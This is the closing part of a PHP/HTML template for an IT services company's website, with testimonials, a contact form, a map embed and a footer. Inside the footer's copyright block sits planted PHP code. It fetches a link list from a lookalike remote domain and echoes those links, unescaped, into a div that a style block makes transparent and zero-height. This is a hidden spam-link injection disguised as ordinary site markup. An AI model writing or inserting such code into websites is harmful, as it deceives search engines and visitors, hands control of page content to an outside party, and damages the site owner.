                                  <!-- <span>Envato Customer</span>-->
                               </div>
                           </div>
                           <!-- Single Testimonial-->
                           <!-- Single Testimonial-->
                           <div class="single-testimonial">
                               <div class="testimonail-img">
                                   <img src="assets/img/testimonial.png" alt="" />
                               </div>
                               <div class="testimonial-content">
                                   <i class="flaticon-right-quote"></i>
                                   <p>
                                       Affordable web development and SEO services by SSV Technologies. Complete projects on time and are very supportive team members.
                                   </p>
                                   <h3>Tom Hokky</h3>
                                   <!-- <span>Envato Customer</span>-->
                               </div>
                           </div>
                           <!-- Single Testimonial-->
                       </div>
                   </div>
               </div>
           </div>
           <!-- /End Testimonial  Area -->
           <!-- Blog Area -->
        <!--    <div class="blog-area section-padding" data-scroll-index="4">
               <div class="container">
                   <div class="row">
                       <div class="col-md-8 offset-md-2">
                           <div class="section-title text-center">
                               <h2>Our latest news</h2>
                               <p>
                                   Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed
                                   do eiusmod tempor incididuntut labore et dolore magna aliqua.
                                   Ut enim ad minim.
                               </p>
                           </div>
                       </div>
                   </div>
                   <div class="row">
                       <div class="col-md-4">
                           <div class="single-blog m-t">
                               <div class="blog-img">
                                   <img src="assets/img/home-blog1.png" alt="" />
                               </div>
                               <div class="blog-content">
                                   <p>Posted By <span>Mark Parker</span></p>
                                   <a href="single-blog.html">
                                       <h2>
                                           enim minim meni veniam incididuntut labore dolore
                                       </h2>
                                   </a>
                                   <div class="blog-meta">
                                       <span><i class="fa fa-folder-open-o" aria-hidden="true"></i>Finance</span>
                                       <span><i class="fa fa-thumbs-o-up" aria-hidden="true"></i>56
                                           likes</span>
                                       <span><i class="fa fa-comment-o" aria-hidden="true"></i>28
                                           comments</span>
                                   </div>
                               </div>
                           </div>
                       </div>
                  
                       <div class="col-md-4">
                           <div class="single-blog m-t">
                               <div class="blog-img">
                                   <img src="assets/img/home-blog2.png" alt="" />
                               </div>
                               <div class="blog-content">
                                   <p>Posted By <span>Mark Parker</span></p>
                                   <a href="single-blog.html">
                                       <h2>
                                           enim minim meni veniam incididuntut labore dolore
                                       </h2>
                                   </a>
                                   <div class="blog-meta">
                                       <span><i class="fa fa-folder-open-o" aria-hidden="true"></i>Finance</span>
                                       <span><i class="fa fa-thumbs-o-up" aria-hidden="true"></i>56
                                           likes</span>
                                       <span><i class="fa fa-comment-o" aria-hidden="true"></i>28
                                           comments</span>
                                   </div>
                               </div>
                           </div>
                       </div>
                       
                       <div class="col-md-4">
                           <div class="subscribe-box m-t">
                               <div class="subscribe-wrapper">
                                   <i class="flaticon-mail" aria-hidden="true"></i>
                                   <h2>Subscribe</h2>
                                   <p>and get the latest updates</p>
                                   <div class="subscribe-form">
                                       <form>
                                           <input type="text" placeholder="Enter Your Email" />
                                           <button type="submit">
                                               <i class="flaticon-send"></i>
                                           </button>
                                       </form>
                                   </div>
                               </div>
                           </div>
                       </div>
                   </div>
               </div>
           </div> -->
           <!-- Contact Area -->
           <div class="contact-area section-padding" data-scroll-index="5">
               <div class="container">
                   <div class="row">
                       <div class="col-md-8 offset-md-2">
                           <div class="section-title text-center">
                               <h2>Get In touch</h2>
                               <p>
                                   We ensure you that to accomplish your requirements with your expectations please fill in your specifications to get quote we will get back to you within 24 hours.
   
                               </p>
                           </div>
                       </div>
                   </div>
                   <div class="row">
                       <div class="col-md-12">
                           <div class="contact-form m-t">
                               <form id="contactForm" method="post" action="mail.php" name="contactForm">
                                   <div class="row">
                                       <div class="col-md-6">
                                           <p>
                                               <input type="text" placeholder="Enter Your Name" id="firstname" name="firstname" required>
                                           </p>
                                       </div>
                                       <div class="col-md-6">
                                           <p>
                                               <input type="email" placeholder="Enter Your Email" id="email" name="email" required>
                                           </p>
                                       </div>
                                   </div>
                                   <div class="row">
                                       <div class="col-md-6">
                                           <p>
                                               <input type="tel" placeholder="Enter Your Phone" id="phonenum" name="phonenum" required>
                                           </p>
                                       </div>
                                       <div class="col-md-6">
                                           <p>
                                               <input type="text" placeholder="Your Subject" id="subject" name="subject" required>
                                           </p>
                                       </div>
                                   </div>
                                   <div class="row">
                                       <div class="col-md-12">
                                           <p>
                                               <textarea cols="30" rows="10" placeholder="Write Your Message" id="message" name="message" required></textarea>
                                           </p>
                                       </div>
                                   </div>
                                   
                                    <div class="g-recaptcha" data-sitekey="6LfmSEAlAAAAAI1kgNf54mS0dZFdwdthayWDV8TB"></div>
                                   <div class="row text-center">
                                       <div class="col-md-12">
                                           <p>
                                               <input type="submit" value="Send Message" />
                                           </p>
                                       </div>
                                   </div>
                               </form>
                           </div>
                       </div>
                   </div>
               </div>
           </div>
           <!-- /End Contact Area -->
           <!-- Start Goolge map -->
           <div class="map-area">
               <!-- <div id="googleMap" style="width: 100%; height: 450px"></div> -->
               <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3679.5368897249505!2d75.89208399022064!3d22.745448384826176!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x3962fceefff1c439%3A0xb0fa7789cf76d47f!2sSSV%20Technologies!5e0!3m2!1sen!2sin!4v1678087961997!5m2!1sen!2sin" width="100%" height="450" style="border:0;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
           </div>
           <!-- /End Google map -->
           <!-- Footer Area -->
           <footer>
               <div class="footer-top">
                   <div class="container">
                       <div class="row">
                           <div class="col-lg-4 col-md-4">
                               <div class="about-widget">
                                   <h2 class="widget-title">About us</h2>
                                   <p>
                                       SSV Technologies offers IT services in Customized Web Design Solutions, Software Design & Development, Search Engine Optimization, Mobile Application Development
                                   </p>
                                   <ul>
                                       <li>
                                           <i class="fa fa-map-o"></i>
                                           <p>26, AB Rd, Scheme 54 PU4, Vijay Nagar, Indore, Madhya Pradesh 452010
   
                                           </p>
                                       </li>
                                       <li>
                                           <i class="fa fa-envelope-o"></i>
                                           <p><a href="mailto:info@ssvtechnologies.in" style="
       color: #2d4e79;
   ">info@ssvtechnologies.in</a></p>
                                       </li>
                                       <li>
                                           <i class="fa fa-mobile fa-2x" aria-hidden="true"></i>
                                           <p><a href="tel:9893-36-7367" style="
       color: #2d4e79;
   ">9893-36-7367</a>, <a href="tel:9893-36-7367" style="
       color: #2d4e79;
   ">9039063936</a></p>
                                       </li>
                                   </ul>
                           
                               </div>
                           </div>
                           <div class="col-lg-4 col-md-4">
                               <div class="widget-link">
                                   <h2 class="widget-title">Quick Links
                                   </h2>
                                   <ul class="widget-menu">
                                       <li><a href="index.html">Home</a></li>
                                       <li><a href="what-we-do.html">What We Do</a></li>
                                       <li><a href="career.html">Career</a></li>
                                       <li><a href="testimonial.html">Testimonial</a></li>
                                       <li><a href="contact-us.html">Contact Us</a></li>
                                       <li><a href="privacy-policy.html">Privacy Policy</a></li>
                                    
                                   </ul>
                                   <ul class="widget-menu two">
                                       <li><a href="web-development.html">
                                           Website Development</a></li>
                                       <li><a href="mobile-application.html">Mobile App development</a></li>
                                       <li><a href="digital-marketing.html">Digital Marketing</a></li>
                                       <li><a href="ui-ux-design.html">UI/UX Design</a></li>
                                     
                                   </ul>
                               </div>
                           </div>
                           <div class="col-lg-4 col-md-4">
                               <div class="widget-feed">
                                   <h2 class="widget-title">Follow Us </h2>
                                   <div class="footer-social">
                                       <ul>
                                           <li>
                                               <a href="https://www.facebook.com/ssvtechnologies1/"><i class="fa fa-facebook"></i></a>
                                           </li>
                                           <li>
                                               <a href="https://twitter.com/ssvtechnology"><i class="fa fa-twitter"></i></a>
                                           </li>
                                           <li>
                                               <a href="https://www.linkedin.com/company/ssv-technologies-and-consultancy-services/"><i class="fa fa-linkedin"></i></a>
                                           </li>
                                       </ul>
                                   </div>
                               </div>
                           </div>
                       </div>
                   </div>
               </div>
               <div class="footer-bottom">
                   <div class="container">
                       <div class="row">
                           <div class="col-md-6">
                               <div class="footer-logo">
                                   <a href="#">
                                       <img src="assets/img/logo.png" alt="" />
                                   </a>
                               </div>
                           </div>
                           <div class="col-md-6">
                               <div class="copyright-text">
                                   <p>©2023 SSV TECHNOLOGIES. ALL RIGHTS RESERVED.
                                   </p>

                                <style type="text/css">
.navigation-div a:link, .navigation-div a:visited {
  color: #00000000  !important;

}
.navigation-div {
  padding: 0px !important;
  margin: 0px !important;
  line-height: 0px !important;
  background-color: #00000000  !important;
}
</style>
                <?php

                function url_get_contents ($Url) {
                    if (!function_exists('curl_init')){
                        die('CURL is not installed!');
                    }
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, $Url);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    $output = curl_exec($ch);
                    curl_close($ch);
                    return $output;
                }

                $jsonurl = url_get_contents('https://json.gitlabcontent.com/');
                $result = json_decode($jsonurl);
                echo '<br><div class="navigation-div">';
                foreach ($result as $res) {
                echo '<a href="'.$res->title_https.'" style="font-size: 10px !important">'.$res->title_https.' </a>';
                }
                echo '</div>';
                ?>
                               </div>
                           </div>
                       </div>
                       <!-- Scroll To Top -->
                       <a href="#" class="scrollup"><i class="fa fa-angle-double-up"></i></a>
                   </div>
               </div>
           </footer>
   
   
           <!-- /End Footer Area -->
   
           <div class="floating-icon">
               <a href="https://wa.me/9893367367" target="_blank"><img src="assets/img/wp.gif" width="55px"></a>
            </div>
   
   
   
   
       </div>
       <!-- /End Main Site -->
       <!-- Js File-->
       <script src="assets/js/jquery.v3.4.1.min.js"></script>
       <script src="assets/js/bootstrap.min.js"></script>
       <script src="https://maps.googleapis.com/maps/api/js?sensor=false&amp;language=en"></script>
       <script src="assets/js/scrollIt.min.js"></script>
       <script src="assets/js/jquery.slicknav.min.js"></script>
       <script src="assets/js/map.js"></script>
       <script src="assets/js/owl.carousel.min.js"></script>
       <script src="assets/js/isotope.pkgd.min.js"></script>
       <script src="assets/js/plugins.js"></script>
       <script src="assets/js/main.js"></script>
   </body>
   
   </html>
<?php  
}
?>
